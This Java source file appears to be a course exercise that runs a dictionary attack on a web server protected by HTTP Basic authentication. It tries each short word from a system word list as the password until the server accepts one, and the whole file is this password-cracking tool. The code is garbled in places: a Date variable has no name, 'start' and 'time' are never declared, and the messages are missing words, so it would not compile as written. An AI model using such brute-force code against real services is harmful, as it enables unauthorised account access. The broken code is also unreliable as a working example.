import java.net.*;
import java.io.*;
import java.util.*;

public class Dictionary {

   public static void main(String[] args) {
      new CrackAttempt();
   }
}

class CrackAttempt {
   public CrackAttempt() {
      final int MAX_LENGTH = 3;
      boolean auth = false;
      Date  = new Date();
      String file = "/usr/share/lib/dict/words";
      String word;
      char[] password = new char[MAX_LENGTH];
      String resource = "http://sec-crack.cs.rmit.edu./SEC/2/";

      while (!auth) {
         
         BufferedReader in = null;
         try {
            
            in = new BufferedReader(new FileReader(file));
            while ((word = in.readLine()) != null && !auth) {
               try {
                  if (word.length() <= MAX_LENGTH) {
                     password = word.toCharArray();
                     
                     Authenticator.setDefault(new CrackAuth(password));
                     URL url = new URL(resource);
                     HttpURLConnection conn = (HttpURLConnection)url.openConnection();
                     conn.setRequestMethod("HEAD");
                     if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                        System.out.println("cracked with " + new String(password));
                        auth = true;
                     }
                  }
               } catch (Exception e) {
                  System.out.println(" was  exception: " + e.getMessage());
               }
            }

         
         } catch (FileNotFoundException fnfe) {
            System.out.println("File Not Found");
         } catch (IOException ioe) {
            System.out.println("IOException");
         } catch(Exception e) {
            e.printStackTrace();
         } finally {
            try {
               in.close();
            } catch (Exception e) {;}
         }


      }
      if (!auth) {
         System.out.println("Unable  determine password");
      } else {
          time = (new Date()).getTime() - start.getTime();
         System.out.println("it took " + String.valueOf(time) + " milliseconds  crack the password");
      }
   }
}

class CrackAuth extends Authenticator {
   char[] password;
   public CrackAuth(char[] password) {
      this.password = password;
   }

   protected PasswordAuthentication getPasswordAuthentication()
   {
      String user = "";
      return new PasswordAuthentication(user, password);
   }
}
